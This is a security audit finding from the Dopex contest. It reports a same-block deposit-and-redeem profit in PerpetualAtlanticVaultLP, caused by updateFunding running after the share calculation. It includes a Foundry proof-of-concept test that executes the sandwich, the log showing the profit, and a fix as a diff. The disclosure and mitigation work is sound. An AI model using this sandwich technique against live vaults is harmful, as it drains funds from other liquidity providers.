[H-05] Users can get immediate profit when deposit and redeem inPerpetualAtlanticVaultLP
Submitted bysaid, also found by0xkazim, glcanvas (1,2),Toshii,KrisApostolov,HHK,Tendency,Evo,bin2chen,bart1e, peakbolt (1,2,3), AkshaySrivastav (1,2),0Kage,sces60107,qpzm,ubermensch,mahdikarimi, 836541 (1,2),Neon2835,nobody2018,carrotsmuggler,lanrebayode77,tapir,volodya,gjaldon, 0xCiphky (1,2),HChang26,max10afternoon, rvierdiiev (1,2),chaduke,QiuhaoLi,etherhood, andjosephdara
Due to wrong order betweenpreviewDepositandupdateFundinginsidePerpetualAtlanticVaultLP.deposit. In some case, user can get immediate profit when calldepositandredeemin the same block.
Proof of Concept
Whendepositis called, firstpreviewDepositwill be called to get thesharesbased onassetsprovided.
https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L118-L135
functiondeposit(uint256assets,addressreceiver)publicvirtualreturns(uint256shares) {// Check for rounding error since we round down in previewDeposit.>>>require((shares=previewDeposit(assets)) !=0,"ZERO_SHARES");>>>perpetualAtlanticVault.updateFunding();// Need to transfer before minting or ERC777s could reenter.collateral.transferFrom(msg.sender,address(this),assets);_mint(receiver,shares);_totalCollateral+=assets;emitDeposit(msg.sender,receiver,assets,shares);}
InsidepreviewDeposit, it will callconvertToSharesto calculate the shares.
https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L269-L271
functionpreviewDeposit(uint256assets)publicviewreturns(uint256) {returnconvertToShares(assets);}
convertToSharescalculate shares based on the providedassets,supplyandtotalVaultCollateral._totalCollateralis also part oftotalVaultCollateralthat will be used inside the calculation.
https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L274-L284
functionconvertToShares(uint256assets)publicviewreturns(uint256shares) {uint256supply=totalSupply;uint256rdpxPriceInAlphaToken=perpetualAtlanticVault.getUnderlyingPrice();uint256totalVaultCollateral=totalCollateral() +((_rdpxCollateral*rdpxPriceInAlphaToken) /1e8);returnsupply==0?assets:assets.mulDivDown(supply,totalVaultCollateral);}
After the shares calculation,perpetualAtlanticVault.updateFundingwill be called, this function will send collateral to vault LP if conditions are met and increase_totalCollateral.
https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/perp-vault/PerpetualAtlanticVault.sol#L502-L524
functionupdateFunding()public{updateFundingPaymentPointer();uint256currentFundingRate=fundingRates[latestFundingPaymentPointer];uint256startTime=lastUpdateTime==0? (nextFundingPaymentTimestamp() -fundingDuration):lastUpdateTime;lastUpdateTime=block.timestamp;>>>collateralToken.safeTransfer(addresses.perpetualAtlanticVaultLP,(currentFundingRate* (block.timestamp-startTime)) /1e18);>>>IPerpetualAtlanticVaultLP(addresses.perpetualAtlanticVaultLP).addProceeds((currentFundingRate* (block.timestamp-startTime)) /1e18);emitFundingPaid(msg.sender,((currentFundingRate* (block.timestamp-startTime)) /1e18),latestFundingPaymentPointer);}
It means if_totalCollateralis increased, user can get immediate profit when they callredeem.
https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L145-L175
functionredeem(uint256shares,addressreceiver,addressowner)publicreturns(uint256assets,uint256rdpxAmount) {perpetualAtlanticVault.updateFunding();if(msg.sender!=owner) {uint256allowed=allowance[owner][msg.sender];// Saves gas for limited approvals.if(allowed!=type(uint256).max) {allowance[owner][msg.sender] =allowed-shares;}}>>> (assets,rdpxAmount) =redeemPreview(shares);// Check for rounding error since we round down in previewRedeem.require(assets!=0,"ZERO_ASSETS");_rdpxCollateral-=rdpxAmount;beforeWithdraw(assets,shares);_burn(owner,shares);collateral.transfer(receiver,assets);IERC20WithBurn(rdpx).safeTransfer(receiver,rdpxAmount);emitWithdraw(msg.sender,receiver,owner,assets,shares);}
WhenredeemPreviewis called and trigger_convertToAssets, it will used this newly increased_totalCollateral.
https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L218-L229
function_convertToAssets(uint256shares)internalviewvirtualreturns(uint256assets,uint256rdpxAmount) {uint256supply=totalSupply;return(supply==0)? (shares,0): (>>>shares.mulDivDown(totalCollateral(),supply),shares.mulDivDown(_rdpxCollateral,supply));}
This will open sandwich and MEV attack opportunity inside vault LP.
Foundry PoC :
Add this test toUnitcontract inside/tests/rdpxV2-core/Unit.t.sol, also addimport "forge-std/console.sol";in the contract :
functiontestSandwichProvideFunding()public{rdpxV2Core.bond(20*1e18,0,address(this));rdpxV2Core.bond(20*1e18,0,address(this));skip(86400*7);vault.addToContractWhitelist(address(rdpxV2Core));vault.updateFundingPaymentPointer();// test funding succesfullyuint256[]memorystrikes=newuint256[](1);strikes[0] =15e6;// calculate funding is done properlyvault.calculateFunding(strikes);uint256funding=vault.totalFundingForEpoch(vault.latestFundingPaymentPointer());// send funding to rdpxV2Core and call syncweth.transfer(address(rdpxV2Core),funding);rdpxV2Core.sync();rdpxV2Core.provideFunding();skip(86400*6);uint256balanceBefore=weth.balanceOf(address(this));console.log("balance of eth before deposit and redeem:");console.log(balanceBefore);weth.approve(address(vaultLp),type(uint256).max);uint256shares=vaultLp.deposit(1e18,address(this));vaultLp.redeem(shares,address(this),address(this));uint256balanceAfter=weth.balanceOf(address(this));console.log("balance after deposit and redeem:");console.log(balanceAfter);console.log("immediate profit :");console.log(balanceAfter-balanceBefore);}
Run the test :
forge test --match-contract Unit --match-test testSandwichProvideFunding -vvv
Log Output :
Logs:balance of eth before deposit and redeem:18665279470073000000000balance after deposit and redeem:18665299797412715619861immediate profit :20327339715619861
Recommended Mitigation Steps
MoveperpetualAtlanticVault.updateFundingbeforepreviewDepositis calculated.
function deposit(uint256 assets,address receiver) public virtual returns (uint256 shares) {+    perpetualAtlanticVault.updateFunding();// Check for rounding error since we round down in previewDeposit.require((shares = previewDeposit(assets)) != 0, "ZERO_SHARES");-    perpetualAtlanticVault.updateFunding();// Need to transfer before minting or ERC777s could reenter.collateral.transferFrom(msg.sender, address(this), assets);_mint(receiver, shares);_totalCollateral += assets;emit Deposit(msg.sender, receiver, assets, shares);}
witherblock (Dopex) disagreed with severity and commented:
Please bump this to high
Alex the Entreprenerd (Judge) increased severity to High